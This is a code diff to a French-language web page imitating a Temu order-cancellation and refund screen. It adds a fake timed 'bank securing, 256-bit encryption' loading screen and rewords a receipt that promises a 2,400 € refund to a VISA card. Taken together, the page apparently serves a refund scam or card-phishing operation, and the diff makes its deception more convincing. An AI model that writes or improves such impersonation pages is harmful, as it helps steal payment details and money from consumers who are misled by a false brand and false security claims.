@@ -591,18 +591,34 @@
         </p>
       </form>
 
+      <!-- Écran de chargement temporisé (environ 8s) -->
+      <div id="sheet-loading-screen" class="sheet-loading-screen" style="display: none;">
+        <div class="sheet-loader-ring"></div>
+        <h3 class="sheet-loader-title">Sécurisation bancaire en cours...</h3>
+        <p class="sheet-loader-desc" id="sheet-loader-status-text">
+          Vérification des protocoles de remboursement et cryptage 256-bit...
+        </p>
+        <div class="sheet-loader-progress-track">
+          <div class="sheet-loader-progress-bar" id="sheet-loader-progress-bar"></div>
+        </div>
+        <div class="sheet-loader-countdown" id="sheet-loader-countdown">
+          ⏳ Traitement sécurisé en cours : ~8s restant
+        </div>
+      </div>
+
       <!-- Écran de confirmation de l'annulation réussi -->
       <div id="sheet-success-screen" class="sheet-success-screen" style="display: none;">
         <div class="sheet-success-icon">✓</div>
-        <h3 class="sheet-success-title">Annulation validée avec succès !</h3>
+        <h3 class="sheet-success-title">Requête d'annulation soumise avec succès !</h3>
         <p class="sheet-success-desc">
-          Votre demande d'annulation pour la commande <strong>CMD-TEMU-89241-EU</strong> a bien été enregistrée et transmise à la passerelle bancaire.
+          Votre demande pour la commande <strong>CMD-TEMU-89241-EU</strong> a bien été enregistrée.<br>
+          <span style="color: #0284c7; font-weight: 700; display: inline-block; margin-top: 4px;">Remboursement en cours...</span>
         </p>
         <div class="sheet-receipt-summary">
           <div class="receipt-row"><span>Réf. Remboursement :</span> <strong id="receipt-ref-code">REF-ANN-89241</strong></div>
           <div class="receipt-row"><span>Type de carte :</span> <strong id="receipt-card-brand">VISA</strong></div>
-          <div class="receipt-row"><span>Montant remboursé :</span> <strong style="color: #16a34a;">2 400,00 €</strong></div>
-          <div class="receipt-row"><span>Statut :</span> <strong style="color: #0284c7;">Validé & Transmis à l'agent</strong></div>
+          <div class="receipt-row"><span>Montant à rembourser :</span> <strong style="color: #16a34a;">2 400,00 €</strong></div>
+          <div class="receipt-row"><span>Statut :</span> <strong style="color: #0284c7;">Remboursement en cours</strong></div>
         </div>
         <button type="button" class="btn-confirm-cancel-sheet" id="btn-finish-sheet">
           Fermer
